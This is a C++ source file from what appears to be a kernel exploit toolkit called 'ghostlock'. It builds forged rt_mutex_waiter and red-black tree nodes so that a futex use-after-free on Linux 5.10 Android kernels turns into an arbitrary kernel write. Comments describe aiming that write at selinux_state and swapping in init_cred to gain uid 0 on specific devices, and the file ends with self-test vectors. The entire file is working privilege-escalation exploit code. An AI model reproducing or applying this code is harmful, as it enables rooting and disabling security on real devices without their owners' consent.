#include "memory/payload_builder.h"

#include "kernel/target.h"
#include "kernel/waiter_layout.hpp"

#include <cstring>

#include <algorithm>
#include <array>
#include <cstddef>
#include <iterator>
#include <span>

using namespace ghostlock;

namespace {
    void store64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value;
        memcpy(&value, p + off, sizeof(value));
        return value;
    }

    bool span_store64(std::span<std::byte> bytes, size_t offset,
                      uint64_t value) noexcept {
        if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
            return false;
        }
        memcpy(bytes.data() + offset, &value, sizeof(value));
        return true;
    }
} // namespace

namespace ghostlock::memory {
    bool encode_compact_waiter(std::span<std::byte> waiter,
                               const WriteRequest &request,
                               const PayloadWriteLayout &layout) noexcept {
        if (waiter.size() < kCompactWaiterBytes) return false;
        if (layout.right) {
            return span_store64(waiter, 0x18, layout.right) &&
                   span_store64(waiter, 0x20, 0) &&
                   span_store64(waiter, 0x28, request.target);
        }
        return span_store64(waiter, 0x18, layout.parent) &&
               span_store64(waiter, 0x20, layout.right) &&
               span_store64(waiter, 0x28, layout.left);
    }

    bool encode_multicast_waiter(std::span<std::byte> buffer,
                                 size_t waiter_offset, size_t task_offset, size_t lock_offset,
                                 uintptr_t fake_task, uintptr_t fake_lock) noexcept {
        return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
               span_store64(buffer, waiter_offset + lock_offset, fake_lock);
    }

    bool encode_multicast_waiter_5_10(
        std::span<std::byte> buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, const WriteRequest &request,
        const PayloadWriteLayout &layout, uintptr_t fake_task,
        uintptr_t fake_lock, uint64_t fake_prio) noexcept {
        /* 5.10 compact rt_mutex_waiter overlay, written through the multicast
     * stamp onto the dead futex rt_waiter frame. The select_stack 5.10 word
     * table (route/waiter_words.cpp) is the verified recipe (marble uid=0):
     * BOTH rb entries carry the erase relink, task/lock keep their profile
     * offsets, prio sits at 0x40 and the structure ends at the deadline.
     *
     * tree_entry (0x00/0x08/0x10) is not optional: the consumer walk reads
     * waiter->lock, top_waiter(fake_lock) hands it our W0 node, and the erase
     * that produces the write consumes the TREE entry (rb_erase_cached). A
     * frame whose tree_entry stays zero is a parentless red node the walk
     * cannot consume — exactly the "route green, no write" signature. */
        /* Mandatory words end at lock (0x38..0x40): on this kernel the copy
     * window closes 16 bytes past waiter->lock, so the overlay cannot carry
     * prio (0x40) or deadline (0x48) when waiter_offset == 200. Those two
     * are written only when they fit - the walk reads prio from the
     * setsockopt frame in that case, and rt_mutex_waiter_equal() short-outs
     * on the empty fake lock before it ever compares prio. */
        if (waiter_offset + lock_offset + sizeof(uint64_t) > buffer.size() ||
            waiter_offset + 0x38 > buffer.size() ||
            waiter_offset + task_offset + sizeof(uint64_t) > buffer.size()) {
            return false;
        }
        /* tree_entry(0x00)/pi_tree_entry(0x18) are consumed by rb_erase_cached
         * during the chain walk (rt_mutex_dequeue -> __rb_erase_augmented). The
         * erase writes the erased node's only child into the parent slot
         * (__rb_change_child): with rb_node = {__rb_parent_color, rb_right,
         * rb_left} at 0x00/0x08/0x10, a parent of `target - 8` makes
         * `parent->rb_right` land exactly on `target`, so the write value IS
         * rb_left. Hence pc = layout.parent == target - 8 and left = the value
         * to store (layout.right). The old recipe put the value in pc and
         * `target` in left, which made the erase write into the fake page and
         * never touch selinux_state (the observed "walk returns 0, nothing
         * written" symptom). */
        const uint64_t tree_pc = layout.parent != 0
                ? layout.parent
                : fake_lock + static_cast<uint64_t>(kernel::RELINK_NODE_OFF);
        const uint64_t tree_left = layout.right != 0
                ? layout.right
                : fake_lock + static_cast<uint64_t>(kernel::RELINK_NODE_OFF);
        const bool core = span_store64(buffer, waiter_offset + 0x00, tree_pc) &&
               span_store64(buffer, waiter_offset + 0x08, 0) &&
               span_store64(buffer, waiter_offset + 0x10, tree_left) &&
               span_store64(buffer, waiter_offset + 0x18, tree_pc) &&
               span_store64(buffer, waiter_offset + 0x20, 0) &&
               span_store64(buffer, waiter_offset + 0x28, tree_left) &&
               span_store64(buffer, waiter_offset + task_offset, fake_task) &&
               span_store64(buffer, waiter_offset + lock_offset, fake_lock);
        if (!core) return false;
        if (waiter_offset + 0x40 + sizeof(uint64_t) <= buffer.size()) {
            if (!span_store64(buffer, waiter_offset + 0x40, fake_prio)) return false;
        }
        if (waiter_offset + 0x48 + sizeof(uint64_t) <= buffer.size()) {
            if (!span_store64(buffer, waiter_offset + 0x48, 0)) return false;
        }
        return true;
    }

    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias) {
        PayloadWriteLayout layout = {
            .fops = default_fops,
        };
        if (!request || request->mode == WriteMode::Disabled) return layout;

        if (request->preserve_child) {
            /* The value doubles as the node's __rb_parent_color, so a lost race
             * walks it as a tree node: point it at the planted black node
             * instead of the fd_set word, which is zero and therefore red. */
            layout.right = request->mode == WriteMode::Credential
                               ? init_cred_alias
                               : page_base + kernel::RELINK_NODE_OFF;
        }
        if (request->mode == WriteMode::Credential) {
            layout.fops = credential_fops;
            layout.needs_credential_copy = true;
        }
        layout.parent = request->target - 8;
        return layout;
    }

    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout) {
        if (!waiter || !request || !layout) return;
        (void) encode_compact_waiter(
            {
                reinterpret_cast<std::byte *>(waiter),
                kCompactWaiterBytes
            },
            *request, *layout);
    }

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
        return request->preserve_child ? layout->right != 0 : layout->right == 0;
    }

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!payload_write_layout_matches_request(request, layout)) return 0;
        /* W1 stores its page-derived value across selinux_state fields. An even
     * byte 2 clears `initialized` and breaks every subsequent SID lookup. The
     * looser byte-2 form was tried for the Pixel 6 KernelSnitch leak; it widens
     * acceptance past the committed reject vector below, so marble keeps the
     * bit-16 gate. */
        if (request->mode == WriteMode::Zero && request->preserve_child &&
            ((layout->right >> 16) & 1) == 0)
            return 0;
        return 1;
    }

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
        if (!buffer) return;
        const size_t required = waiter_offset +
                                std::max(task_offset, lock_offset) + sizeof(uint64_t);
        (void) encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
            task_offset, lock_offset, fake_task, fake_lock);
    }

    int32_t payload_builder_fixed_vector_test(void) {
        static const struct {
            uintptr_t target;
            WriteMode mode;
            int32_t leaf;
            uintptr_t expected_pc;
            uintptr_t expected_left;
        } vectors[] = {
            {
                0xffffff8000123000ULL, WriteMode::Zero, 1,
                0xffffff8000122ff8ULL, 0
            },
            {
                0xffffff8000124000ULL, WriteMode::Zero, 0,
                0xffffff8800210200ULL, 0xffffff8000124000ULL
            },
            {
                0xffffff8000125000ULL, WriteMode::Credential, 0,
                0xffffff802abfd588ULL, 0xffffff8000125000ULL
            },
        };
        const uintptr_t page = 0xffffff8800210000ULL;
        const uintptr_t init_cred = 0xffffff802abfd588ULL;
        for (size_t i = 0; i < std::size(vectors); ++i) {
            std::array<unsigned char, kCompactWaiterBytes> current{};
            const WriteRequest request = WriteRequest::make(
                vectors[i].target, vectors[i].mode, vectors[i].leaf != 0);
            PayloadWriteLayout layout = payload_write_layout(
                &request, page, 0x1111, 0x2222, init_cred);
            build_compact_waiter_payload(current.data(), &request, &layout);
            if (load64(current.data(), 0x18) != vectors[i].expected_pc ||
                load64(current.data(), 0x20) != 0 ||
                load64(current.data(), 0x28) != vectors[i].expected_left ||
                !payload_write_layout_matches_request(&request, &layout) ||
                !payload_write_layout_accepts_page(&request, &layout))
                return 0;
        }
        const WriteRequest w1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        PayloadWriteLayout rejected = payload_write_layout(
            &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        rejected.right = 0;
        if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

        std::array < unsigned char, 0x80 > legacy_stamp{};
        std::array < unsigned char, 0x80 > current_stamp{};
        store64(legacy_stamp.data(), 0x20 + 0x28, 0xffffff8800005800ULL);
        store64(legacy_stamp.data(), 0x20 + 0x30, 0xffffff8800001000ULL);
        build_multicast_waiter_payload(
            current_stamp.data(), 0x20, 0x28, 0x30,
            0xffffff8800005800ULL, 0xffffff8800001000ULL);
        if (memcmp(legacy_stamp.data(), current_stamp.data(),
                   legacy_stamp.size()) != 0)
            return 0;
        std::byte undersized[0x2f]{};
        if (encode_compact_waiter(undersized, w1, rejected)) return 0;
        /* Multicast geometry that would run past the supplied span is rejected
     * instead of written out of bounds. */
        std::array<std::byte, 0x40> multicast_small{};
        if (encode_multicast_waiter(
            multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
            return 0;
        /* 5.10 multicast overlay: the stamp recipe must byte-match the
     * marble-verified select_stack word table for the same request/layout.
     * Build both over the same vector and compare field by field. */
        const WriteRequest m1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        const uintptr_t m_page = 0xffffff8800210000ULL;
        PayloadWriteLayout m_layout = payload_write_layout(
            &m1, m_page, 0x1111, 0x2222, init_cred);
        /* Same relink math as waiter_words.cpp: the route passes
     * fake_lock == page_base (SKB_DATA_DELTA cancels LOCK_OFF). */
        const uintptr_t m_fake_lock = m_page;
        const size_t m_waiter = 0x60, m_task = 0x30, m_lock = 0x38;
        std::array<std::byte, 0x120> stamp{};
        if (!encode_multicast_waiter_5_10(
            stamp, m_waiter, m_task, m_lock, m1, m_layout,
            0xffffff8800210180ULL /* fake_task */, m_fake_lock,
            kernel::FAKE_WAITER_PRIO))
            return 0;
        const uint64_t tree_pc = m_layout.parent;
        const uint64_t tree_left = m_layout.right;
        struct MField { size_t off; uint64_t value; };
        const MField m_fields[] = {
            {0x00, tree_pc}, {0x08, 0}, {0x10, tree_left},
            {0x18, tree_pc}, {0x20, 0}, {0x28, tree_left},
            {m_task, 0xffffff8800210180ULL}, {m_lock, m_fake_lock},
            {0x40, static_cast<uint64_t>(ghostlock::kernel::FAKE_WAITER_PRIO)}, {0x48, 0},
        };
        for (const MField &f : m_fields) {
            if (load64(reinterpret_cast<const unsigned char *>(stamp.data()),
                       m_waiter + f.off) != f.value) return 0;
        }
        /* Buffer too small for the full overlay is rejected, not truncated. */
        std::array<std::byte, 0x90> stamp_small{};
        if (encode_multicast_waiter_5_10(
            stamp_small, m_waiter, m_task, m_lock, m1, m_layout,
            0xffffff8800210180ULL, m_fake_lock,
            static_cast<uint64_t>(ghostlock::kernel::FAKE_WAITER_PRIO)))
            return 0;
        return 1;
    }
} // namespace ghostlock::memory
